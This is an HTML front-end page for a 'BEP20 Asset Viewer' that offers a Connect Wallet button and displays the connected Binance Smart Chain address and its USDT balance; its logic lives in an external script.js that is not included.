<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Asset Viewer | Secure Node</title>
    <link rel="stylesheet" href="style.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/4.1.1/web3.min.js"></script>
</head>
<body>

    <div class="container">
        <div class="card" id="main-card">
            <h2>BEP20 Asset Viewer</h2>
            <p>Connect your wallet to view your current Binance Smart Chain (BSC) token balances safely.</p>
            
            <button id="connectBtn">Connect Wallet</button>

            <div id="status-container" style="display: none;">
                <div class="spinner"></div>
                <p id="status-text">Initializing...</p>
            </div>

            <div id="results" style="display: none;">
                <hr>
                <p><strong>Connected Address:</strong><br><span id="userAddr"></span></p>
                <div class="balance-box">
                    <span>USDT Balance:</span>
                    <span id="usdtBalance">0.00</span>
                </div>
            </div>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>
